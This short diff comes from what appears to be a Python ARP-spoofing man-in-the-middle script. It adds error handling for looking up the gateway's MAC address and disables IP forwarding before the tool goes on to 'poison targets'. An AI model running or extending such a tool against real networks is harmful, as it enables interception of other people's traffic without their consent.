@@ -48,6 +48,13 @@ def mitm():
         print("[!] Couldn't Find Victim MAC Address")
         print("[!] Exiting...")
         sys.exit(1)
+    try: 
+        gatewayMAC = get_mac(gatewayIP)
+    except Exception:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print("[!] Couldn't Find Gateway MAC Address")
+        print("[!] Exiting...")
+        sys.exit(1)
     print("[*] Poisoning Targets...")
     while 1:
         try:
